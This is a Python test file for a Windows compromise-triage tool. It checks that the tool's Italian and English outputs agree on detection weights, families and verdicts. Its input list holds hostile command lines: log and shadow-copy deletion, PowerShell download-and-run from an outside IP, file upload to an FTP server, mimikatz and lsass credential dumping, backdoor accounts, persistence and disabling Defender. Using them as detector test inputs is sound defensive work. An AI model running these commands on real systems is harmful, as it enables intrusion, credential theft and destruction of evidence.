# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# Le due lingue dei risultati. Senza scegliere una lingua si lavora in italiano; in inglese cambiano i
# testi ma non i pesi, le famiglie e i verdetti; i ragionamenti che riconoscono un motivo dal suo testo
# funzionano in tutte e due le lingue; ogni thread ha la sua lingua.
import base64
import re
import threading

import tc_lingua
import tc_lingua_en
import tc_regole as R
import tc_eventi
import tc_c_registro
import tc_c_file
import tc_controlli
import tc_report

IT, EN = tc_lingua.ITALIANO, tc_lingua.INGLESE
fallite = [0]


def prova(nome, ottenuto, atteso=True):
    if ottenuto != atteso:
        fallite[0] += 1
        print 'NO  %s: atteso %r, ottenuto %r' % (nome, atteso, ottenuto)


def enc(testo):
    return base64.b64encode(testo.encode('utf-16-le')).decode('ascii')


RIGHE = [
    u'wevtutil cl Security',
    u'wevtutil cl Application',
    u'auditpol /clear /y',
    u'vssadmin delete shadows /all /quiet',
    u'bcdedit /set {default} recoveryenabled No',
    u'cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1700000000.123 2>&1',
    u'cmd.exe /C whoami > C:\\Windows\\Temp\\AbCdEfGh.tmp 2>&1',
    u'cmd.exe /C whoami > C:\\Windows\\Temp\\filelist.tmp 2>&1',
    u'%COMSPEC% /Q /c echo cd ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > %TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat',
    u'cmd /c echo abcdef > \\\\.\\pipe\\abcdef',
    u'powershell -nop -w hidden -enc ' + enc(u'IEX (New-Object Net.WebClient).DownloadString("http://1.2.3.4/a")'),
    u'powershell -enc ' + enc(u'Get-Date'),
    u'powershell -enc ' + enc(u'Set-MpPreference -DisableRealtimeMonitoring $true'),
    u'powershell -nop -w hidden -c "iex (irm http://1.2.3.4/a)"',
    u'certutil.exe -urlcache -split -f http://1.2.3.4/a.exe a.exe',
    u'certutil -decode a.txt a.exe',
    u'bitsadmin /transfer job http://1.2.3.4/a.exe c:\\a.exe',
    u'msiexec /q /i http://1.2.3.4/a.msi',
    u'curl.exe -o C:\\Users\\Public\\a.exe http://1.2.3.4/a.exe',
    u'curl -T C:\\d.zip ftp://a:b@45.77.10.20/',
    u'C:\\Users\\Public\\svchost.exe',
    u'C:\\Windows\\Temp\\a.exe',
    u'mimikatz.exe sekurlsa::logonpasswords',
    u'cmd /c C:\\Tools\\Rubeus.exe kerberoast',
    u'findstr /i mimikatz *.log',
    u'Select-String -Pattern Invoke-Mimikatz *.ps1',
    u'psexec \\\\srv cmd',
    u'procdump64.exe -accepteula -ma lsass.exe l.dmp',
    u'schtasks /create /tn Updater /tr "C:\\Users\\Public\\u.exe" /sc onlogon /ru SYSTEM',
    u'sc create x binPath= "cmd /c net user hacker P@ss /add"',
    u'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d "C:\\Users\\Public\\u.exe" /f',
    u'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /d cmd.exe /f',
    u'net user hacker P@ssw0rd /add',
    u'net localgroup administrators hacker /add',
    u'Set-MpPreference -DisableRealtimeMonitoring $true',
    u'IEX (New-Object Net.WebClient).DownloadString("http://1.2.3.4/a.ps1")',
    u'Invoke-Mimikatz -DumpCreds',
    u'rundll32 \\\\1.2.3.4@80\\share\\a.dll,Entry',
    u'regsvr32 /s /n /u /i:http://1.2.3.4/a.sct scrobj.dll',
    u'mshta http://1.2.3.4/a.hta',
    u'cmd /c p^o^w^e^r^s^h^e^l^l -nop -c calc',
    u'conhost.exe --headless cmd /c dir',
    u'wmic /node:srv process call create "cmd /c whoami"',
    u'netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.0.5 connectport=3389',
    u'cmd /c finger user@1.2.3.4 | cmd',
    u'cmd /c copy C:\\Users\\x\\a.exe C:\\Users\\Public\\b.exe',
    u'notepad.exe C:\\note.txt',
    u'',
]


def scheletro(riga):
    """Quello che non deve cambiare con la lingua, e i testi che invece cambiano."""
    rac = tc_eventi.Raccolta()      # i giudizi gia' dati restano in memoria: una raccolta nuova per ogni lingua
    testi = []
    g = R.valuta_comando(riga)
    ge = R.valuta_comando(riga, persistenza=False)
    testi.extend(g.motivi + ge.motivi)
    noti = R.comandi_noti(riga)
    testi.extend([c for p, f, c in noti])
    ps = R.ps_sospetto(riga)
    console = R.riga_di_console(riga) if riga else None
    eseguibile = R.spezza_comando(riga)[0]
    strumento = R.strumento(eseguibile)
    nominato = R.strumento_nominato(riga, True)
    processo = rac._giudica_processo(eseguibile, R.con_estensione(R.nome_base(eseguibile)), riga)
    consumer = tc_c_file._giudica_consumer(u'X\n' + riga)
    servizio = tc_c_registro.giudica_servizio(u'servizio', riga)
    firma = R.firma_smbexec(u'servizio', riga)
    for x in (ps and ps[1], console and console[2], strumento[1], nominato[1], consumer[1], firma and firma[1]):
        if x:
            testi.append(x)
    testi.extend([x[2] for x in processo] + servizio[3])
    fisso = (g.livello, g.certo, g.avvio, len(g.motivi), ge.livello, ge.certo, len(ge.motivi), [(p, f) for p, f, c in noti],
             ps and (ps[0], ps[2]), console and (console[0], console[1]), strumento[0], nominato[0],
             [(x[0], x[1], x[3]) for x in processo], consumer[0], servizio[:3], len(servizio[3]), firma and firma[0],
             [R.sui_registri(c) for p, f, c in noti])
    return fisso, testi


# Parole intere che compaiono nei testi italiani e mai in quelli inglesi
SPIE = re.compile(u'(?<![a-z])(di|che|da|del|una|nel|non|cartella|comando|scarica|strumento|registri|servizio|codificato'
                  u'|rete|esegue|lancia|cancellazione|segnali|segnale|controllo|controlli|cronologia|verdetto|peso'
                  u'|famiglia|quando|nessun|della)(?![a-z])')

try:
    # ---- senza scegliere una lingua: italiano
    prova('lingua predefinita', tc_lingua.lingua(), IT)
    prova('tr() in italiano non cambia il testo', tc_lingua.tr(u'Fatto'), u'Fatto')
    prova('N_() non traduce', tc_lingua.N_(u'Fatto'), u'Fatto')
    prova('valida', [tc_lingua.valida(x) for x in (u'en', u'IT', u' en ', u'fr', u'', None, 7)], [EN, IT, EN, None, None, None, None])
    prova('nome del peso in italiano', R.NOME_PESO[R.DECISIVO], u'Decisivo')
    prova('nome del peso mancante', R.NOME_PESO.get(0, u''), u'')

    in_italiano = [scheletro(r) for r in RIGHE]
    tc_lingua.imposta(EN)
    prova('lingua impostata', tc_lingua.lingua(), EN)
    prova('tr() in inglese', tc_lingua.tr(u'Fatto'), u'Done')
    prova('un testo senza traduzione resta com\'e\'', tc_lingua.tr(u'testo che nel catalogo non c\'e\''), u'testo che nel catalogo non c\'e\'')
    prova('tr_in() non tocca la lingua corrente', (tc_lingua.tr_in(IT, u'Fatto'), tc_lingua.tr_in(EN, u'Fatto'), tc_lingua.lingua()),
          (u'Fatto', u'Done', EN))
    prova('nome del peso in inglese', (R.NOME_PESO[R.DECISIVO], R.NOME_PESO.get(R.DA_CONFERMARE), R.NOME_PESO.get(0, u'')),
          (u'Decisive', u'To confirm', u''))
    in_inglese = [scheletro(r) for r in RIGHE]
    con_testi = 0
    for riga, (fisso_it, testi_it), (fisso_en, testi_en) in zip(RIGHE, in_italiano, in_inglese):
        prova('stessi pesi e famiglie nelle due lingue: ' + riga[:60].encode('utf-8'), fisso_en, fisso_it)
        prova('stesso numero di testi: ' + riga[:60].encode('utf-8'), len(testi_en), len(testi_it))
        for a, b in zip(testi_it, testi_en):
            con_testi += 1
            prova('testo tradotto: ' + a[:70].encode('utf-8'), a != b)
            prova('nessuna parola italiana in: ' + b[:70].encode('utf-8'), SPIE.findall(b.lower()), [])
    prova('le righe di prova producono abbastanza testi', con_testi > 150)

    # ---- i ragionamenti che riconoscono un motivo dal testo
    for lingua in (IT, EN):
        tc_lingua.imposta(lingua)
        r = R.riga_di_console(u'findstr /i mimikatz *.log')
        prova('strumento solo cercato per nome: contesto (%s)' % lingua, r and r[0], R.INFORMATIVO)
        prova('strumento solo cercato per nome: il motivo comincia cosi\' (%s)' % lingua,
              bool(r) and r[2].startswith(tc_lingua.tr(u'cerca per nome uno ')))
        r = R.riga_di_console(u'Select-String -Pattern Invoke-Mimikatz *.ps1')
        prova('script solo cercato per nome: contesto (%s)' % lingua, r and r[0], R.INFORMATIVO)
        g = R.valuta_comando(u'powershell -enc ' + enc(u'Set-MpPreference -DisableRealtimeMonitoring $true'), persistenza=False)
        prova('comando codificato che tocca Defender: forte ma non certo (%s)' % lingua, (g.livello, g.certo), (3, False))
        g = R.valuta_comando(u'powershell -enc ' + enc(u'Invoke-Mimikatz -DumpCreds'), persistenza=False)
        prova('comando codificato d\'attacco: certo (%s)' % lingua, (g.livello, g.certo), (3, True))
        prova('cancellare il Security riguarda i registri (%s)' % lingua,
              [R.sui_registri(c) for p, f, c in R.comandi_noti(u'wevtutil cl Security')], [True])
        prova('cancellare un altro registro anche (%s)' % lingua,
              [R.sui_registri(c) for p, f, c in R.comandi_noti(u'wevtutil cl Application')], [True])
        prova('creare un account no (%s)' % lingua,
              [R.sui_registri(c) for p, f, c in R.comandi_noti(u'net user hacker x /add')], [False])
        # un blocco di script breve che cerca uno script d'attacco per nome non viene registrato
        rac = tc_eventi.Raccolta()
        rac._elemento = None
        rac._4104({'Dati': {u'ScriptBlockText': u'Select-String -Pattern Invoke-Mimikatz *.ps1', u'MessageTotal': u'1'},
                   'Livello': 4, 'Ora': 1700000000.0, 'SidUtente': u''})
        prova('blocco 4104 che cerca soltanto: nessun segnale (%s)' % lingua, len(rac.powershell), 0)
        rac._4104({'Dati': {u'ScriptBlockText': u'Invoke-Mimikatz -DumpCreds', u'MessageTotal': u'1'},
                   'Livello': 4, 'Ora': 1700000000.0, 'SidUtente': u''})
        prova('blocco 4104 d\'attacco: un segnale decisivo (%s)' % lingua, [x['peso'] for x in rac.powershell.values()], [R.DECISIVO])
        # le modifiche a Defender dicono che cosa e' cambiato senza passare dal testo
        for valore, atteso in ((u'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0', True),
                               (u'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\DisableAntiSpyware = 0x1', False)):
            rac._defender_modifica({'Dati': {u'New Value': valore}, 'EventID': 5007, 'Ora': 1700000000.0})
            prova('modifica di Defender, esclusione %r (%s)' % (atteso, lingua), rac.defender_modifiche[-1]['esclusione'], atteso)

    # ---- un triage finto: verdetto, report e CSV nelle due lingue
    class RadiceFinta(object):
        piatta = False
        unica = True
        prefisso = u'/'
        volume = None

        def descrizione(self):
            return u'/'

    def triage_finto():
        t = tc_controlli.Triage(RadiceFinta())
        t.contesto['computer'] = u'PC-PROVA'
        peso, cosa = R.strumento(u'mimikatz.exe')
        t.segnala(21, peso, R.famiglia_strumento(u'mimikatz.exe'), cosa, u'', 1700000000.0)
        for p, f, c in R.comandi_noti(u'net user hacker x /add'):
            t.segnala(25, p, f, c, u'', 1700000100.0)
        t.decidi()
        return t

    esiti = {}
    for lingua in (IT, EN):
        tc_lingua.imposta(lingua)
        t = triage_finto()
        esiti[lingua] = (t, tc_report.html(t, {'origine': u'prova', 'caso': u'prova', 'generato': 1700000000}), tc_report.csv(t),
                         t.riassunto(), t.stato_controllo(21)[0], [s.titolo() for s in t.segnali_ordinati()])
    t_it, html_it, csv_it, riassunto_it, stato_it, titoli_it = esiti[IT]
    t_en, html_en, csv_en, riassunto_en, stato_en, titoli_en = esiti[EN]
    prova('il verdetto e\' lo stesso oggetto nelle due lingue', (t_it.verdetto, t_en.verdetto),
          (tc_controlli.V_COMPROMESSA, tc_controlli.V_COMPROMESSA))
    prova('stesse famiglie', [s.famiglia for s in t_en.segnali], [s.famiglia for s in t_it.segnali])
    prova('riassunto in italiano', riassunto_it, u'COMPROMISSIONE PROBABILE - 1 decisivi, 1 da confermare')
    prova('riassunto in inglese', riassunto_en, u'LIKELY COMPROMISED - 1 decisive, 1 to confirm')
    prova('stato del controllo', (stato_it, stato_en), (u'Segnale decisivo', u'Decisive finding'))
    prova('titoli dei controlli', (titoli_it, titoli_en),
          ([u'Prefetch', u'Comandi sospetti (eventi 4688, Sysmon, PowerShell)'],
           [u'Prefetch', u'Suspicious commands (events 4688, Sysmon, PowerShell)']))
    prova('lingua dichiarata nel report', (u'<html lang="it">' in html_it, u'<html lang="en">' in html_en), (True, True))
    prova('verdetto nel report', (u'COMPROMISSIONE PROBABILE' in html_it, u'LIKELY COMPROMISED' in html_en,
                                  u'COMPROMISSIONE' in html_en), (True, True, False))
    # il testo del report, senza il foglio di stile e senza i tag (i nomi delle classi e delle ancore sono italiani)
    solo_testo = re.sub(u'<[^>]*>', u' ', html_en[html_en.find(u'</style>'):]).lower()
    prova('nessuna parola italiana nel report inglese', sorted(set(SPIE.findall(solo_testo))), [])
    solo_testo = re.sub(u'<[^>]*>', u' ', html_it[html_it.find(u'</style>'):]).lower()
    prova('la stessa ricerca nel report italiano le trova', len(set(SPIE.findall(solo_testo))) > 10)
    prova('CSV in italiano: punto e virgola', csv_it.split(u'\r\n')[0][:22], u'"Peso";"Quando (UTC)";')
    prova('CSV in inglese: virgola', csv_en.split(u'\r\n')[0][:22], u'"Weight","When (UTC)",')
    prova('CSV: stesso numero di righe', csv_en.count(u'\r\n'), csv_it.count(u'\r\n'))

    # ---- il catalogo
    testi = tc_lingua_en.TESTI
    prova('chiavi e traduzioni sono testi unicode', [k for k, v in testi.items() if not isinstance(k, unicode) or not isinstance(v, unicode)], [])
    prova('nessuna traduzione vuota', [k for k, v in testi.items() if not v.strip() and k.strip()], [])
    # I motivi dei segnali servono anche a non contare due volte lo stesso fatto: due motivi diversi
    # non devono avere la stessa traduzione. Le sole traduzioni condivise sono queste intestazioni.
    per_traduzione = {}
    for k, v in testi.items():
        per_traduzione.setdefault(v, []).append(k)
    prova('traduzioni uguali per testi diversi', sorted([v for v in per_traduzione if len(per_traduzione[v]) > 1]),
          [u' and others', u'Cleared logs', u'Created (UTC)', u'Deleted (UTC)', u'Source'])

    # ---- ogni thread ha la sua lingua
    tc_lingua.imposta(EN)
    visti = {}

    def lavoro(nome, lingua):
        if lingua:
            tc_lingua.imposta(lingua)
        giusti = 0
        for _ in range(3000):
            if tc_lingua.tr(u'Fatto') == {EN: u'Done'}.get(lingua, u'Fatto') and R.strumento(u'mimikatz.exe')[1] == \
                    {EN: u'attack tool (mimikatz)'}.get(lingua, u'strumento d\'attacco (mimikatz)'):
                giusti += 1
        visti[nome] = giusti

    fili = [threading.Thread(target=lavoro, args=(nome, lingua)) for nome, lingua in (('it', IT), ('en', EN), ('nessuna', None))]
    for f in fili:
        f.start()
    for f in fili:
        f.join()
    prova('tre thread insieme, ognuno con la sua lingua', visti, {'it': 3000, 'en': 3000, 'nessuna': 3000})
    prova('il thread principale resta in inglese', tc_lingua.tr(u'Fatto'), u'Done')
finally:
    tc_lingua.imposta(IT)       # le altre prove si aspettano l'italiano

print 'lingue: %d righe di comando confrontate, prove fallite %d' % (len(RIGHE), fallite[0])
